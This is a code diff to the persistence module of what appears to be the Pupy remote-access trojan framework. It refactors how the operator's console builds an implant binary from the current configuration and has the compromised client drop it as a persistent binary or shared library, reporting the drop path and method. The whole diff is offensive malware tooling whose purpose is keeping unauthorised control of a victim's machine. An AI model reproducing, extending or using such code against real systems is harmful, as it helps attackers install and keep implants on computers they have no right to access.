@@ -68,15 +68,8 @@ class PersistenceModule(PupyModule):
             #TODO persistency removal
             self.error("not implemented for linux")
             return
-        manager = self.client.conn.modules['persistence'].DropManager()
-        self.success('Available methods: ' + ', '.join(
-            method for method,state in manager.methods.iteritems() if state is True
-        ))
 
-        for method, result in manager.methods.iteritems():
-            if result is not True:
-                self.error('Unavailable method: {}: {}'.format(method, result))
-
+        drop = self.client.remote('persistence', 'drop', False)
         exebuff, tpl, _ = pupygen.generate_binary_from_template(
             self.client.get_conf(),
             self.client.desc['platform'],
@@ -87,13 +80,11 @@ class PersistenceModule(PupyModule):
         self.success("Generating the payload with the current config from {} - size={}".format(
             tpl, len(exebuff)))
 
-        if args.shared:
-            drop_path, conf_path = manager.add_library(exebuff)
-        else:
-            drop_path, conf_path = manager.add_binary(exebuff)
-
-        if drop_path and conf_path:
-            self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
+        drop_path, conf_path, method = drop(exebuff, args.shared)
+        if drop_path and conf_path and method:
+            self.success('Dropped: {} Method: {} Config: {}'.format(drop_path, method, conf_path))
+        elif method:
+            self.error('Failed: {}'.format(method))
         else:
             self.error('Couldn\'t make service persistent.')
 
